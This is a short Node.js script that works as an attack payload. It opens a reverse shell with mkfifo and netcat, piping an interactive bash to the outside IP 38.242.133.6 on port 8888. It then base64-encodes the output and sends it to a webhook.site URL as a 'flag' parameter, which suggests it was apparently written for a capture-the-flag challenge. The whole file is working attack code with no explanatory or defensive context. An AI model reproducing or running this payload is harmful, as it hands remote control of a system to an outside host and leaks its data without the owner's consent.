const https = require('https');
const fs = require('fs');

const { exec } = require("child_process");

exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 38.242.133.6 8888 >/tmp/f", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    flag = Buffer.from(stdout).toString('base64');
    https.get('https://webhook.site/7190197b-0f77-492c-b0f5-5ac4438d46a4?flag=' + flag, res => {

    }).on('error', err => {
        console.log('Error: ', err.message);
    });
});